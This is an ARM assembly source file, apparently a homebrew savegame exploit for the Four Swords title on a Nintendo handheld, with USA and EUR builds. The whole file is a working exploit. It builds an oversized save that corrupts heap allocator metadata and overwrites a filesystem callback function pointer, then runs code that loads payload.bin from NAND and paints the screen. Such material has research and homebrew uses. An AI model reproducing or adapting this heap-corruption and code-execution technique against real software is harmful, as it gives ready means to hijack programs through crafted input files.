.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init
.arm

#define REGION_USA 45
#define REGION_EUR 56

#define	REG_BASE	0x04000000

#define FS_InitCtx 0x20102d4
#define	FS_Open 0x2010b1c
#define	FS_Close 0x2010ba0

#define	FS_Read 0x2010c84

#if REGCODE==REGION_USA
#define HEAPCTX_ADR 0x2177090
#define TARGET_FUNCPTR 0x20c90dc+0x24 //Adr of the func ptr to overwrite, this is some FS Open related callback for FATFS.(savedata) This is used soon after the heaphax.

#elif REGCODE==REGION_EUR
#define HEAPCTX_ADR 0x21770b0
#define TARGET_FUNCPTR 0x20c90fc+0x24
#else
#error "Unsupported region."
#endif

#define HEAP_NEXTCHUNKADR HEAPCTX_ADR+0x58
#define JUMPADR HEAP_NEXTCHUNKADR+0x10

_start:
.incbin "basesav.bin" @ This is the whole 0x800-byte actual save, with a modified playername.("HAXXXX") This save  checksum is invalid, but that's ignored since at least one of the save-files have a valid filesize.
@ 4swords has two savefiles, savedata/all.dat and savedata/backup.dat. When loading one fails,(in this case larger than normal filesize) it will fallback to loading the other savefile. It will then continue without error as long as loading one of the saves worked.(it will stop loading the save *after* it reads the save into memory with the filesize, when the filesize is too large. by then it's too late to stop haxx, it seems even if *both* saves were corrupted the attacked heap stuff below would still be used & exploited before their "corrupted save" delete+recreate code executes.)

.word 0, 0
.word HEAPCTX_ADR @ Adr of the next word. Starting with that adr, we overwrite a class with a vtable, but that class doesn't matter since it seems to be only used before loading the save.
.word 0 @ Without this padding, the title will overwrite heapctx+0x34 with a vtable ptr after the savedata was loaded.
.word 0 @ Without this here, the title would overwrite heapctx+0x24+12 with a vtable ptr.
.word HEAPCTX_ADR+4 @ This is actually a ptr to the heapctx.
.space 0x24 @ Heapctx here. No need to have correct data in this block when the alloc func works fine like this.
.word HEAP_NEXTCHUNKADR
.word 0
.word 0
.word TARGET_FUNCPTR-12 @ When allocating memory, for the below memchunk this is done: memchunk->prev = *(heapctx+0x24+12); memchunk->prev->next = memchunk; Thus, the data at TARGET_FUNCPTR will be overwritten with the adr of the below memchunk. Some data will be executed that's not code when it jumps there, but this doesn't cause any crash. 
.hword 0 @ padding
.hword 0 @ offset 0x36 in heapctx.

.space 0x50-0x34
@ nextchunk data goes here.
.word 0
.word 0x1000 @ Available free space when chunk is free, used space otherwise.
.word TARGET_FUNCPTR-12 @ prev memchunk ptr
.word JUMPADR @ next memchunk ptr


.align 2
code_start:
b code
.word 0
.word 0
.word 0 @ The data here will be overwritten by the memalloc code, so branch around it.
code:
orr	r0, pc, #1
bx	r0

.thumb
mov r0, sp
ldr r4, =FS_InitCtx
blx r4

mov r0, sp
adr r1, payloadpath
mov r2, #1
ldr r4, =FS_Open
blx r4

mov r0, sp
mov r3, #0x0020
lsl r3, #4
add r3, #0x20
lsl r3, #16 @ 0x02200000
mov r1, #0x40
lsl r1, #8
@sub r3, r1 @ since we're reading the payload appended to the savimage, subtract the readadr by 0x4000.
mov r7, r3
mov r1, r3
mov r2, #0xd4
lsl r2, #8
add r2, #4 @ 0xd404
@add r2, r4
ldr r4, =FS_Read
blx r4

mov r0, sp
ldr r4, =FS_Close
blx r4

/*mov r1, r7
bx r1*/

ldr	r7, =REG_BASE
ldr	r1, =0x208
str	r7, [r7, r1]		@ IME = 0;
mov	r1, #0
ldr 	r5, =0x6c
strh	r1, [r7, r5]

ldr	r2, =0x1000 @ display stuff on the screens so you know for certain haxx is running on hw.(from cookhack)
add	r3, r2, r7
strh	r1, [r3, r5]

add	r2,r2,r7
mov	r0,r7
ldr	r3, =0x10100
str	r3, [r0]
str	r3, [r2]

ldr	r5, =0x200
str	r5, [r0, #0x08]
str	r5, [r2, #0x08]

ldr	r3, =0x240
add	r3, r3, r0
str	r1, [r0]
strh	r1, [r0, #0x04]
strb	r1, [r0, #0x06]
strb	r1, [r0, #0x08]
	
mov	r1, #0x81
strb	r1, [r0]
mov	r1, #0x84
strb	r1, [r0,#0x02]

ldr	r4, =0x05000000		@ engine A palette
mov	r1, #0x1f
str	r1, [r4]
ldr	r5, =0x400
str	r1, [r4, r5]		@ engine B palette
code_end:
b code_end

.pool
.align 2

payloadpath:
#if REGCODE==REGION_USA
.string "nand:/title/00030004/4b513945/data/payload.bin"
#elif REGCODE==REGION_EUR
.string "nand:/title/00030004/4b513956/data/payload.bin"
#endif
.align 2

.space (_start + 0x1c00) - .

